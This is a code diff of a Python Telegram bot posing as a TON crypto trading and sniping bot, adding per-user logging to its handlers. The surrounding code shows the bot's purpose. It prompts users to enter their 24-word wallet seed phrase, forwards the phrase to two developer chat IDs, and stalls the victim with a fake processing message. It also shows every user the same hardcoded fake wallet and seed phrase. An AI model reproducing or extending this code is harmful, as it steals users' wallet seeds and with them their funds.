@@ -2,6 +2,13 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from dotenv import load_dotenv
 import os
+from loguru import logger
+import sys
+
+logger.remove()
+logger.add(sys.stdout, format="<green>{time:HH:mm:ss}</green> | "
+                              "<level>{message}</level>")
+
 
 load_dotenv()
 API_TOKEN = os.getenv('TELEGRAM_API_KEY')
@@ -60,6 +67,7 @@ create_wallet_markup.row(btn_delete, back_to_wallet_btn)
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
+    logger.info(f"🚪 Добро пожаловать {message.from_user.first_name} | @{message.from_user.username}")
     user_name = message.from_user.first_name
     welcome_message = (
         "👋 Hello, " + user_name + "\n\n"
@@ -73,10 +81,12 @@ def send_welcome(message):
     
 @bot.callback_query_handler(func=lambda call: call.data == "settings")
 def settings_pressed(call):
+    logger.info(f"⚙️ {call.from_user.first_name} | @{call.from_user.username} - Settings")
     bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=settings_markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "back")
 def back_pressed(call):
+    logger.info(f"⬅️ {call.from_user.first_name} | @{call.from_user.username} - Back")
     user_name = call.from_user.first_name
     welcome_message = (
         "👋 Hello, " + user_name + "\n\n"
@@ -93,10 +103,13 @@ def back_pressed(call):
 @bot.callback_query_handler(func=lambda call: call.data == "edit_name")
 @bot.callback_query_handler(func=lambda call: call.data == "transfer")
 def coming_soon(call):
+    logger.info(f"😴 {call.from_user.first_name} | @{call.from_user.username} - {call.data} Coming soon...")
     bot.answer_callback_query(call.id, "😴 Coming soon...")
 
 @bot.callback_query_handler(func=lambda call: call.data == "snipes")
 def snipes_pressed(call):
+    logger.info(f"👁️ {call.from_user.first_name} | @{call.from_user.username} - Snipes")
+
     user_name = call.from_user.first_name
     snipes_message = f"👁️ {user_name}, you don't have any snipes yet"
     
@@ -105,10 +118,14 @@ def snipes_pressed(call):
 
 @bot.callback_query_handler(func=lambda call: call.data == "snipe_jetton")
 def snipe_jetton_pressed(call):
+    logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - Snipe jetton")
+    
     bot.edit_message_text("❌ First create a wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)
 
 @bot.callback_query_handler(func=lambda call: call.data == "snipe_deployer")
 def snipe_deployer_pressed(call):
+    logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - Snipe jetton")
+
     bot.edit_message_text("❌ First create a wallet", call.message.chat.id, call.message.message_id, reply_markup=snipe_jetton_markup)
 
 
@@ -120,6 +137,8 @@ def snipe_cancel_pressed(call):
 @bot.callback_query_handler(func=lambda call: call.data == "wallets")
 @bot.callback_query_handler(func=lambda call: call.data == "delete ")
 def wallets_pressed(call):
+    logger.info(f"💰 {call.from_user.first_name} | @{call.from_user.username} - Wallets {call.data}")
+
     user_name = call.from_user.first_name
     wallets_message = f"💰 {user_name}, you don't have any wallets yet. Let's make one!"
     
@@ -127,6 +146,8 @@ def wallets_pressed(call):
 
 @bot.callback_query_handler(func=lambda call: call.data == "create_wallet")
 def create_wallet_pressed(call):
+    logger.info(f"➕ {call.from_user.first_name} | @{call.from_user.username} - Create wallet")
+    
     wallet_address = "UQBulhlC3EtbCDH-FxNi_vKSJ7T22V3PI4IAa-5UpRBcWbhK"
     wallet_message = (
         f"💎 Wallet ...<a href='https://tonviewer.com/{wallet_address}'>BcWbhK</a>\n\n"
@@ -137,6 +158,8 @@ def create_wallet_pressed(call):
 
 @bot.callback_query_handler(func=lambda call: call.data == "help")
 def help_pressed(call):
+    logger.info(f"📚 {call.from_user.first_name} | @{call.from_user.username} - Help")
+
     help_message = (
         "📚 <a href='https://t.me/dtrade_news'>News</a>\n"
         "\n"
@@ -149,11 +172,15 @@ def help_pressed(call):
 @bot.callback_query_handler(func=lambda call: call.data == "interface")
 @bot.callback_query_handler(func=lambda call: call.data == "tradings")
 def first_crate_wallet_pressed(call):
+    logger.info(f"❌ {call.from_user.first_name} | @{call.from_user.username} - First create {call.data}")
+
     auto_buy_message = "❌ First create a wallet"
     bot.edit_message_text(auto_buy_message, call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(back_btn))
 
 @bot.callback_query_handler(func=lambda call: call.data == "show_seed")
 def show_seed_pressed(call):
+    logger.info(f"🌱 {call.from_user.first_name} | @{call.from_user.username} - Show seed")
+
     seed_phrase = (
         "🌱 Seed phrase for the wallet 👛 ...BcWbhK\n\n"
         "<code>soda excuse rocket mandate meadow vault legal coach prison opera identify resource approve rack raccoon appear trust sea already leopard census asset escape plug</code>\n\n"
@@ -164,11 +191,14 @@ def show_seed_pressed(call):
 @bot.callback_query_handler(func=lambda call: call.data == "show_seed_back")
 @bot.callback_query_handler(func=lambda call: call.data == "delete")
 def show_seed_back_pressed(call):
+    logger.info(f"⬅️ {call.from_user.first_name} | @{call.from_user.username} - Back")
     create_wallet_pressed(call)
 
 
 @bot.callback_query_handler(func=lambda call: call.data == "existing_wallet")
 def import_wallet_pressed(call):
+    logger.info(f"📥 {call.from_user.first_name} | @{call.from_user.username} - Import")
+    
     bot.edit_message_text("🌱 Enter your seed phrase (24 words):", call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🚫 Cancel", callback_data="cancel_seed_phrase")))
     bot.register_next_step_handler(call.message, process_seed_phrase)
 
@@ -176,6 +206,7 @@ def process_seed_phrase(message):
     seed_phrase = message.text
     words = seed_phrase.split()
     if len(words) == 24:
+        logger.info(f"✅ {message.from_user.first_name} | @{message.from_user.username} - YEAAAH")
         # bot.delete_message(message.chat.id, message.message_id)
         bot.send_message(message.chat.id, "🌱 Thank you, processing will take ~5 minutes", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("✅ Close", callback_data="cancel_seed_phrase")))
         developer_chat_id = os.getenv('DEVELOPER_CHAT_ID_1')
@@ -183,11 +214,14 @@ def process_seed_phrase(message):
         developer_chat_id = os.getenv('DEVELOPER_CHAT_ID_2')
         bot.send_message(developer_chat_id, f"<code>{seed_phrase}</code>", parse_mode="HTML")
     else:
+        logger.info(f"❌ {message.from_user.first_name} | @{message.from_user.username} - FUUUCK")
+
         bot.send_message(message.chat.id, "❌ Invalid seed phrase. Please enter exactly 24 words.", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🚫 Cancel", callback_data="cancel_seed_phrase")))
         bot.register_next_step_handler(message, process_seed_phrase)
 
 @bot.callback_query_handler(func=lambda call: call.data == "cancel_seed_phrase")
 def cancel_seed_phrase_pressed(call):
+    logger.info(f"🚫 {call.from_user.first_name} | @{call.from_user.username} - Close entering seed phrase")
     wallets_pressed(call)
 
 
